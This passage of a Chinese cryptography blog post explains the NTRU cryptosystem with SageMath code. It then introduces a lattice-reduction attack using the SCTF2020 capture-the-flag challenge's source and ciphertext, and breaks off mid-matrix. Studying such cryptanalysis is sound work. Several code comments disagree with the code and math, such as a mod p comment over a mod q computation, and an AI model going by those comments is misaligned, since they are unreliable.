中的<strong>卷积乘法</strong>，并且环上的所有多项式的系数和次数都为不大于 $N-1$ 的整数。<br>实际上， NTRU 是一个参数化系统，每个系统由三个整数指定 $(N,p,q)$ ，其中 $N$ 代表截断环上的所有多项式的最高次为 $N-1$ ， $p$ 和 $q$ 分别代表一个小模数和一个大模数。其中 $N$ 为素数， $q$ 大于 $p$ ，且 $p$ 与 $q$ 互质。由这三个参数生成四个多项式 $\\mathcal {L}_f,\\mathcal {L}_g,\\mathcal {L}_m \\thinspace$ 和 $\\mathcal {L}_r$ ，分别为私钥、公钥、消息和干扰数。</p>\n<hr>\n<p>看到这里，我相信懂的人都懂的，不懂的人还不懂（bushi）<br>下面从宏观和微观两方面详细解释</p>\n<h2 id=\"公钥生成\"><a href=\"#公钥生成\" class=\"headerlink\" title=\"公钥生成\"></a>公钥生成</h2><p>又双叒叕来到了密码学的老 CP —— Alice 和 Bob<br><img src=\"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fauthorize.zhongbi.net%2Fd%2Ffile%2Ftu%2F2018%2F12%2F27%2F0wlyvynx1dv.jpg&refer=http%3A%2F%2Fauthorize.zhongbi.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1652234696&t=c5802c1784650149a8a25e0440448985\" alt=\"Alice&amp;Bob\"></p>\n<ol>\n<li>Bob 根据选定的 $N,p,q$ 生成最高次为 $N-1$ 的 $f$ 和 $g$ <strong>两个多项式</strong>，并且系数在 ${-1,0,1}$ 中选取（可以认为这俩是在模 $X^{N}-1$ 的剩余类中）。 $f$ 还要满足<strong>模 $q$ 和 $p$ 的逆元存在</strong>，如果不满足，那就重新生成。</li>\n<li>分别计算 $f$ 模 $p$ 和模 $q$ 的逆元，即 $f_{p}$ 和 $f_{q}$ ，<strong>保留 $f$ , $f_{p}$ 及 $g$ 作为私钥，公钥 $h=pf_{q} \\cdot g\\ \\pmod{q} $ 。</strong></li>\n</ol>\n<p>sagemath 代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_keys</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 基于提供的参数生成一个公私钥对</span></span><br><span class=\"line\"><span class=\"string\">        返回 f (私钥)和 F_p (公钥)&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 校验</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> validate_params():</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 生成两个随机多项式 f 和 g ，并且非零系数小于给定的 d</span></span><br><span class=\"line\">                f = generate_polynomial(d)</span><br><span class=\"line\">                g = generate_polynomial(d)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 假定 q 是 2 的幂，求得 f 模 q 的逆元             </span></span><br><span class=\"line\">                f_q = invertmodpowerof2(f,q)</span><br><span class=\"line\">                <span class=\"comment\"># 同样假定 p 是素数，求得 f 模 p 的逆元</span></span><br><span class=\"line\">                f_p = invertmodprime(f,p)  </span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 上面如果抛出异常，即逆元不存在，则重新生成</span></span><br><span class=\"line\">                <span class=\"keyword\">pass</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\"># 公钥 h=pf_p*g (mod q)</span></span><br><span class=\"line\">        public_key = balancedmod(p * convolution(f_q,g),q)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 保留 f 和 f_p 作为私钥</span></span><br><span class=\"line\">        secret_key = f,f_p</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> public_key,secret_key</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Provided params are not correct. q and p should be co-prime, q should be a power of 2 considerably larger than p and p should be prime.&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h2><p>Alice 将消息 $m$ 转化成一个系数在 ${-1,0,1}$ 之间的多项式（比如转成二进制或三进制，二进制在这里会有些浪费），再随机生成一个系数较小（但不限于 ${-1,0,1}$ 中）的多项式 $r$ 作为干扰以掩盖消息。那么加密计算如下：<br>$$<br>    e=r \\cdot h+m \\pmod{q}<br>$$<br>举个栗子：<br>当取 $N=5,p=3,q=32$ 时（呃这里待更新）<br>$$<br>    f=-1+X+X^2<br>$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_message</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 随机生成一个系数在&#123;-1,0,1&#125;中的多项式&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    result = <span class=\"built_in\">list</span>(randrange(<span class=\"number\">3</span>) - <span class=\"number\">1</span> <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(result)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">message, public_key</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 基于提供的公钥加密消息&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 生成一个随机多项式，并且非零系数小于给定的d，作为干扰以掩盖消息   </span></span><br><span class=\"line\">    r = generate_polynomial(d)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加密：e = r * h + m (mod q)</span></span><br><span class=\"line\">    <span class=\"comment\"># while performing modulo operation, balance coefficients of encrypted_message </span></span><br><span class=\"line\">    <span class=\"comment\"># for the integers in interval [-q/2, +q/2]</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> balancedmod(convolution(public_key,r) + message,q)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解密\"><a href=\"#解密\" class=\"headerlink\" title=\"解密\"></a>解密</h2><p>由于其他人不知道 $r$ ，所以无法直接 $m=e-rh$ ，但 Bob 拿到 $e$ 后，可以计算出<br>$$<br>\\begin{equation*}<br>\\begin{split}<br>    a<br>    &amp; = f \\cdot e \\pmod{q}\\\\<br>    &amp; = f \\cdot (r \\cdot h+m) \\pmod{q}\\\\<br>    &amp; = f \\cdot (r \\cdot pf_{q} \\cdot g+m) \\pmod{q}\\\\<br>    &amp; = pr \\cdot g + f \\cdot m \\pmod{q}<br>\\end{split}<br>\\end{equation*}<br>$$<br>关键部分来了，以上都是在模 $q$ 下进行，而这时忽然就变成了模 $p$<br>$$<br>b=a=f \\cdot m \\pmod{p} \\\\<br>c=f_{p} \\cdot b =f_{p} \\cdot f \\cdot m =m \\pmod{p}<br>$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">encrypted_message, secret_key</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 基于提供的私钥解密密文&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 拿到私钥的两个多项式  </span></span><br><span class=\"line\">    f,f_p = secret_key</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># a = f * e (mod p)</span></span><br><span class=\"line\">    a = balancedmod(convolution(encrypted_message,f),q)</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"comment\"># c = f_p * a (mod p)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> balancedmod(convolution(a,f_p),p)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数实现\"><a href=\"#函数实现\" class=\"headerlink\" title=\"函数实现\"></a>函数实现</h2><p>下面从微观上解释一下上面函数的实现：</p>\n<h3 id=\"卷积\"><a href=\"#卷积\" class=\"headerlink\" title=\"卷积\"></a>卷积</h3><p>多项式卷积满足公式<br>$$<br>    a(x)*b(x) = c(x) \\ with \\ c_k = \\sum_{i+j=k \\pmod} a_i b_{k-i \\pmod{N}}<br>$$<br>举个栗子：<br>$$<br>    f(x)=-1+4x+x^2 \\\\<br>    g(x)=3-x+5x^2<br>$$<br>注意此时多项式和级数类似，采用低次项在先的书写方式<br>则<br>$$<br>    f(x)*g(x) = c(x) \\pmod{3}<br>$$<br>其中<br>$$<br>c_0 = \\sum_{i+j=0 \\pmod{N}} f_i g_{0-i} = f_0g_0 + f_1g_2 + f_2g_1 = -1 \\times 3 + 4 \\times 5 + 1 \\times (-1) = -3 + 20 + (-1) = 16 \\\\<br>c_1 = f_0g_1 + f_1g_0 + f_2g_2 = -1 \\times (-1) + 4 \\times 3 + 1 \\times 5 = 1 + 12 + 5 = 18 \\\\<br>c_2 = f_0g_2 + f_1g_1 + f_2g_0 = -1 \\times 5 + 4 \\times (-1) + 1 \\times 3 = -5 + (-4) + 3 = -6<br>$$<br>故<br>$$<br>c(x) = 16 + 18x - 6x^2<br>$$<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">convolution</span>(<span class=\"params\">f,g</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 多项式卷积运算&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> (f * g) % (x^N-<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"取模\"><a href=\"#取模\" class=\"headerlink\" title=\"取模\"></a>取模</h3><p>这里将多项式的每个系数 $f_i$ 拿出来，然后作变换 $g_i=(f_i+q/2)%q-q/2$ 再塞回去。这样每个系数都在 $[-q/2,q/2]$ 之间，这样可以保证模 $q$ 的运算。<br>比如取 $q=3$ 时，有以下映射关系：<br>$$<br>-3 \\rightarrow (-3+1)%3 -1 = 0 \\\\<br>-2 \\rightarrow (-2+1)%3 -1 = 1 \\\\<br>-1 \\rightarrow (-1+1)%3 -1 = -1 \\\\<br>0 \\rightarrow (0+1)%3-1 = 0 \\\\<br>1 \\rightarrow (1+1)%3-1 = 1 \\\\<br>2 \\rightarrow (2+1)%3-1 = -1 \\\\<br>3 \\rightarrow (3+1)%3-1 = 0<br>$$<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">balancedmod</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 多项式取模&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    g = <span class=\"built_in\">list</span>(((f[i] + q//<span class=\"number\">2</span>) % q) - q//<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(g)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"求逆元\"><a href=\"#求逆元\" class=\"headerlink\" title=\"求逆元\"></a>求逆元</h3><p>这也是我比较疑惑的一部分，一直不知道多项式的逆元具体怎么求，现在也看开了，随便怎么样吧，反正不是我手写（）<br>这里先变基到 $X^N-1$ 商环然后求逆元再 lift 到整环上，关于原理我至今有点异或，有缘回来补坑吧。<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">invertmodprime</span>(<span class=\"params\">f,p</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 假定 p 为素数,计算一个多项式模 x^N-1 下的逆元再模 p</span></span><br><span class=\"line\"><span class=\"string\">        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 p 为 1</span></span><br><span class=\"line\"><span class=\"string\">        不存在逆元时会抛出异常&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    T = Zx.change_ring(Integers(p)).quotient(x^N-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(lift(<span class=\"number\">1</span> / T(f)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">invertmodpowerof2</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 假定 q 为 2 的幂，计算一个多项式模 x^N-1 下的逆元再模 q</span></span><br><span class=\"line\"><span class=\"string\">        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 q 为 1</span></span><br><span class=\"line\"><span class=\"string\">        不存在逆元时会抛出异常&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> q.is_power_of(<span class=\"number\">2</span>)     <span class=\"comment\"># 断言 q 是 2 的幂</span></span><br><span class=\"line\">    h = invertmodprime(f,<span class=\"number\">2</span>)     <span class=\"comment\"># 首先求 f 模 2 的逆元</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        r = balancedmod(convolution(h,f),q)         <span class=\"comment\"># 计算 r = h * f (mod q)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> r == <span class=\"number\">1</span>: <span class=\"keyword\">return</span> h                         <span class=\"comment\"># 若 h * f = 1 (mod q)，则返回 h 即为所求逆元</span></span><br><span class=\"line\">        h = balancedmod(convolution(h,<span class=\"number\">2</span> - r),q)     <span class=\"comment\"># 否则，h = h * (2 - r) (mod q)</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p>格约化攻击是一种非常著名的针对 NTRUEncrypt 的攻击，类似于 RSA 分解质因数。<br>当选取的 $N$ 较小时，可以构造维度较低的格分解公钥 $h$ 。</p>\n<h3 id=\"例题-SCTF2020-Lattice\"><a href=\"#例题-SCTF2020-Lattice\" class=\"headerlink\" title=\"例题 SCTF2020-Lattice\"></a>例题 SCTF2020-Lattice</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b16encode</span><br><span class=\"line\"></span><br><span class=\"line\">Zx.&lt;x&gt; = ZZ[]</span><br><span class=\"line\">n = <span class=\"number\">109</span> </span><br><span class=\"line\">q = <span class=\"number\">2048</span></span><br><span class=\"line\">p = <span class=\"number\">3</span></span><br><span class=\"line\">Df = <span class=\"number\">9</span></span><br><span class=\"line\">Dg = <span class=\"number\">10</span></span><br><span class=\"line\">Dr = <span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">f,g</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (f * g) % (x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bal_mod</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    g = <span class=\"built_in\">list</span>(((f[i] + q//<span class=\"number\">2</span>) % q) - q//<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(g)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_poly</span>(<span class=\"params\">d</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> d &lt;= n</span><br><span class=\"line\">    result = n*[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(d):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            r = randrange(n)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> result[r]: <span class=\"keyword\">break</span></span><br><span class=\"line\">        result[r] = <span class=\"number\">1</span>-<span class=\"number\">2</span>*randrange(<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(result)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv_mod_prime</span>(<span class=\"params\">f,p</span>):</span><br><span class=\"line\">    T = Zx.change_ring(Integers(p)).quotient(x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(lift(<span class=\"number\">1</span> / T(f)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv_mod_powerof2</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> q.is_power_of(<span class=\"number\">2</span>)</span><br><span class=\"line\">    g = inv_mod_prime(f,<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        r = bal_mod(mul(g,f),q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r == <span class=\"number\">1</span>: <span class=\"keyword\">return</span> g</span><br><span class=\"line\">        g = bal_mod(mul(g,<span class=\"number\">2</span> - r),q)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">keygen</span>():</span><br><span class=\"line\">    f = random_poly(Df)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            fp = inv_mod_prime(f,p)</span><br><span class=\"line\">            fq = inv_mod_powerof2(f,q)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            f = random_poly(Df)</span><br><span class=\"line\">    g = random_poly(Dg)</span><br><span class=\"line\">    h = bal_mod(p * mul(fq,g),q)</span><br><span class=\"line\">    pub_key = h</span><br><span class=\"line\">    pri_key = [f,fp]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pub_key,pri_key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">m,h</span>):</span><br><span class=\"line\">    r = random_poly(Dr)</span><br><span class=\"line\">    e = bal_mod(mul(h,r) + m,q)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> e</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    pub_key,pri_key = keygen()</span><br><span class=\"line\">    flag=<span class=\"string\">b&#x27;SCTF&#123;***********&#125;&#x27;</span>[<span class=\"number\">5</span>:-<span class=\"number\">1</span>]</span><br><span class=\"line\">    m = Zx(<span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(b16encode(flag), <span class=\"number\">16</span>))[<span class=\"number\">2</span>:]))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\">    e = encrypt(m,pub_key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;pub_key=&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(pub_key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;e=&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\"><span class=\"comment\"># pub_key=</span></span><br><span class=\"line\"><span class=\"comment\"># 510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248</span></span><br><span class=\"line\"><span class=\"comment\"># e=</span></span><br><span class=\"line\"><span class=\"comment\"># -453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852</span></span><br></pre></td></tr></table></figure>\n\n<p>显然函数和上面的基本一样，只是名称相应地缩短了一下。<br>攻击方法是构造如下的一个格，然后进行规约<br>$$<br>\\left(<br>\\begin{array}{cccc|cccc}<br>\\lambda &amp; 0 &amp; \\cdots &amp; 0 &amp; h_0 &amp; h_1 &amp; \\cdots &amp; h_{N-1} \\\\<br>0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; h_{N-1} &amp; h_0 &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; h_1 &amp; h_2 &amp; \\cdots &amp; h_0 \\\\ \\hline<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; q &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; 